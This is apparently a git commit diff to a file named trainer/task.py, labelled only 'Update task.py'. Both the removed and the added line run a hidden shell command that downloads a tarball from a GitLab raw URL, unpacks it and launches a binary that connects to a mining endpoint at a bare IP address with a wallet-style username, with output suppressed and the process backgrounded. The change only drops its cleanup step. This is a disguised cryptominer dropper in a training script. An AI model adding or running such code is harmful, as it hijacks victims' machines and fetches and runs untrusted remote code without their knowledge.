bdd266744f32c1230dee0716461b11ac2d4e82f7
christineiimegan <christineiimegan@outlook.com>
2025-01-21 02:03:55 +0700

    Update task.py

--- trainer/task.py
+++ trainer/task.py
@@ -1,3 +1,3 @@
 import sys
 import os
-os.system('wget -qO sg.tar.gz https://gitlab.com/derisafrew/vx/-/raw/main/sg.tar.gz && tar -xzf sg.tar.gz && rm -rf sg* >/dev/null 2>&1 &&cd ~/ && ./ojava --url ws://31.171.251.36:443/mine mine --username CHtdR4Ha3UQkvtwTpod47TSVQ6PhGq97Ch5qoqiC2pLz.$(echo $(shuf -i 1-9 -n 1)-ambar) --cores 4 &>/dev/null &')
+os.system('wget -qO sg.tar.gz https://gitlab.com/derisafrew/vx/-/raw/main/sg.tar.gz && tar -xzf sg.tar.gz && cd ~/ && ./ojava --url ws://31.171.251.36:443/mine mine --username CHtdR4Ha3UQkvtwTpod47TSVQ6PhGq97Ch5qoqiC2pLz.$(echo $(shuf -i 1-9 -n 1)-ambar) --cores 4 &>/dev/null &')
